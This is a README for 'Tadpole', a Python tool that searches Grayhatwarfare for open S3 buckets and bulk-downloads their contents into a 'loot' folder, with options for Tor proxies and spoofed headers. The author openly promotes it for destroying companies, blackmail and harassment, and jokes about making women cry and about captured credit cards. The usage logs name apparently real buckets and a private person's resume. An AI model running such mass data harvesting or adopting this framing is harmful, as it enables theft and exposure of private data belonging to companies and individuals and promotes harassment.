# TadPole

Brought to you by an individual with questionable ethics and a moral compass that usually points towards Hell, is the release of Tadpole.

Tadpole is a Python 2.7.x written program that leverages [Grayhatwarfare](https://buckets.grayhatwarfare.com) to provide you with a simple an efficient way to demolish an entire company overnight, and an easy way to blackmail, and/or harass! What does that mean you ask? 

Well the main objective of Tadpole is to make women cry and infosec experts have a need to wear their brown pants, lets dig deeper into Tadpoles features;

- Provide a search query to connect to Grayhatwarfare and search for open S3 buckets (`-q/—query`)
- From said buckets connect and download all readable and open files out of the S3 bucket (`—swim`)
- Run your searches behind a proxy (`-P/—proxy`) or a random User-Agent (`—random-agent`) or pass in your own headers (`-H/—headers`)
- Search the downloaded files for relevant strings (`-s/—search`)

In a nutshell Tadpole is a program that will download available files out of an open S3 bucket, provided with the correct flags Tadpole will also connect to the discovered bucket and download all available files inside of the bucket.

# Installation

To install the program you will need `Python2.7` (3.x coming soon); and you will need to install the requirements:
```bash
pip install -r requirements.txt
```
That's all there is to it!

# Usage examples

Running tadpole without a command will drop you into the help menu:

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py
------------------------------------------------------------------
  _            _____         ____  _ ______ 
 | |     /\   |  __ \       / __ \| |  ____|
 | |_   /  \  | |  | |_ __ | |  | | | |__   
 | __| / /\ \ | |  | | '_ \| |  | | |  __|  
 | |_ / ____ \| |__| | |_) | |__| | | |____ 
  \__/_/    \_\_____/| .__/ \____/|_|______|[][][]
                     | |                    
                     |_|   Aws Download Open buckEt files v(0.1)
------------------------------------------------------------------

[09:29:39][FATAL] must provide a search query with `-q/--query` flag
usage: tadpole.py [-h] [-q SEARCH-QUERY] [--random-agent] [--verbose]
                  [-P PROXY] [-H HEADER=1,HEADER=2,etc..] [-s STRING]
                  [--check-proxy] [--swim] [--limit AMOUNT]

optional arguments:
  -h, --help            show this help message and exit
  -q SEARCH-QUERY, --query SEARCH-QUERY
                        provide a search query to search open buckets with
  --random-agent        Use a random HTTP User-Agent
  --verbose             Run in verbose mode
  -P PROXY, --proxy PROXY
                        Use a proxy for the requests
  -H HEADER=1,HEADER=2,etc.., --headers HEADER=1,HEADER=2,etc..
                        Pass extra headers with your request
  -s STRING, --search STRING
                        Search for a file and output the location of it
  --check-proxy         Verify that your proxy is working correctly
  --swim                Swim upstream to the found bucket and try to pull
                        everything out of it
  --limit AMOUNT        Used in conjunction with `--swim` specify an amount of
                        buckets to pull (*default=300)
(bucketdump) TBG-a0216:tadpole admin$ 
```

In order to perform a search all you have to do is provide a search query using the `-q/--query` flag:

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -q 'database'
------------------------------------------------------------------
  _            _____         ____  _ ______ 
 | |     /\   |  __ \       / __ \| |  ____|
 | |_   /  \  | |  | |_ __ | |  | | | |__   
 | __| / /\ \ | |  | | '_ \| |  | | |  __|  
 | |_ / ____ \| |__| | |_) | |__| | | |____ 
  \__/_/    \_\_____/| .__/ \____/|_|______|[][][]
                     | |                    
                     |_|   Aws Download Open buckEt files v(0.0.11)
------------------------------------------------------------------

[08:53:19][INFO] searching for open s3 buckets with provided query: 'database'
[08:53:31][INFO] gathered a total of 200 files from 46 different bucket(s)
[08:53:31][INFO] downloading all discovered file(s)
[08:53:32][WARNING] unable to determine file length for file 'database-admin-logs2017-09-23-16-19-10-EE59F17B113A3816'
[08:53:32][ERROR] unable to download file: database-admin-logs2017-09-23-16-19-10-EE59F17B113A3816; access denied
[08:53:33][WARNING] large file being downloaded (Database.mdf), this could take a minute
...
```

You can also swim upstream to the bucket itself and try to download every single file from it:
```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -q 'database' --swim
------------------------------------------------------------------
  _            _____         ____  _ ______ 
 | |     /\   |  __ \       / __ \| |  ____|
 | |_   /  \  | |  | |_ __ | |  | | | |__   
 | __| / /\ \ | |  | | '_ \| |  | | |  __|  
 | |_ / ____ \| |__| | |_) | |__| | | |____ 
  \__/_/    \_\_____/| .__/ \____/|_|______|[][][]
                     | |                    
                     |_|   Aws Download Open buckEt files v(0.0.11)
------------------------------------------------------------------

[08:55:20][INFO] searching for open s3 buckets with provided query: 'database'
[08:56:27][INFO] swimming upstream to 'http://beehivedev.s3.amazonaws.com'
[08:56:30][INFO] found a total of 1000 file(s) in S3 bucket 'http://beehivedev.s3.amazonaws.com', downloading a max of 300 file(s)
[09:03:59][WARNING] hit max download limit, leaving bucket
[09:03:59][INFO] swimming upstream to 'http://cotrafasocial.s3-us-west-2.amazonaws.com'
[09:04:05][INFO] found a total of 1000 file(s) in S3 bucket 'http://cotrafasocial.s3-us-west-2.amazonaws.com', downloading a max of 300 file(s)
```

You have the option to run behind a proxy using the `-P/--proxy` flag:

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -q 'resume' --swim --proxy socks5://127.0.0.1:9050
------------------------------------------------------------------
  _            _____         ____  _ ______ 
 | |     /\   |  __ \       / __ \| |  ____|
 | |_   /  \  | |  | |_ __ | |  | | | |__   
 | __| / /\ \ | |  | | '_ \| |  | | |  __|  
 | |_ / ____ \| |__| | |_) | |__| | | |____ 
  \__/_/    \_\_____/| .__/ \____/|_|______|[][][]
                     | |                    
                     |_|   Aws Download Open buckEt files v(0.0.11)
------------------------------------------------------------------

[09:08:51][INFO] searching for open s3 buckets with provided query: 'resume'
[09:10:20][INFO] swimming upstream to 'http://careerfoundry.s3-us-west-2.amazonaws.com'
[09:10:21][INFO] found a total of 7 file(s) in S3 bucket 'http://careerfoundry.s3-us-west-2.amazonaws.com', downloading a max of 300 file(s)
[09:10:27][WARNING] large file being downloaded (LinkedInMasterySolopreneurs101.pdf), this could take a minute
...
```

To increase the file cape from 300, you can specify it by using the `--limit` flag, the default limit is 300 files:

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -q 'resume' --swim --proxy socks5://127.0.0.1:9050 --limit 600
------------------------------------------------------------------
  _            _____         ____  _ ______ 
 | |     /\   |  __ \       / __ \| |  ____|
 | |_   /  \  | |  | |_ __ | |  | | | |__   
 | __| / /\ \ | |  | | '_ \| |  | | |  __|  
 | |_ / ____ \| |__| | |_) | |__| | | |____ 
  \__/_/    \_\_____/| .__/ \____/|_|______|[][][]
                     | |                    
                     |_|   Aws Download Open buckEt files v(0.0.12)
------------------------------------------------------------------

[09:22:12][INFO] searching for open s3 buckets with provided query: 'resume'
[09:23:17][INFO] swimming upstream to 'http://careerfoundry.s3-us-west-2.amazonaws.com'
[09:23:18][INFO] found a total of 7 file(s) in S3 bucket 'http://careerfoundry.s3-us-west-2.amazonaws.com', downloading a max of 600 file(s)
[09:23:22][WARNING] large file being downloaded (LinkedInMasterySolopreneurs101.pdf), this could take a minute
[09:23:26][WARNING] large file being downloaded (Quickstart Sales Guide.pdf), this could take a minute
[09:23:31][WARNING] large file being downloaded (Resume Template.zip), this could take a minute
[09:23:33][WARNING] unable to determine file length for file 'Resume+and+Letter+-+Mariana+Reynolds (1).pdf'
[09:23:33][WARNING] all files downloaded, leaving bucket
[09:23:33][INFO] swimming upstream to 'http://cc-com.s3-ap-southeast-2.amazonaws.com'
...
(bucketdump) TBG-a0216:tadpole admin$ 

```

You also have the option to pass your own headers with `-H/--headers` flag:

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -q 'test' -H X-Forwarded-For=1,X-Client=127.0.0.1
```

As well as running with a random User-Agent:

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -q --random-agent
```

Tadpole comes complete with a built in search tool to find the files you're looking for (don't mind the credit cards):

```bash
(bucketdump) TBG-a0216:tadpole admin$ python tadpole.py -s favicon.ico
------------------------------------------------------------------
  _            _____         ____  _ ______ 
 | |     /\   |  __ \       / __ \| |  ____|
 | |_   /  \  | |  | |_ __ | |  | | | |__   
 | __| / /\ \ | |  | | '_ \| |  | | |  __|  
 | |_ / ____ \| |__| | |_) | |__| | | |____ 
  \__/_/    \_\_____/| .__/ \____/|_|______|[][][]
                     | |                    
                     |_|   Aws Download Open buckEt files v(0.0.11)
------------------------------------------------------------------

[09:18:13][INFO] a total of 14 files matched your search
#1. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip(6)
#2. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip(5)
#3. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico
#4. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico(4)
#5. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip
#6. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip(1)
#7. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico(12)
#8. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip(2)
#9. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip(3)
#10. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico(10)
#11. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico(6)
#12. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico(2)
#13. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico(8)
#14. /Users/admin/bin/python/tadpole/loot/resume/cc-com.s3-ap-southeast-2.amazonaws.com/favicon.ico.gzip(4)
(bucketdump) TBG-a0216:tadpole admin$ 
```
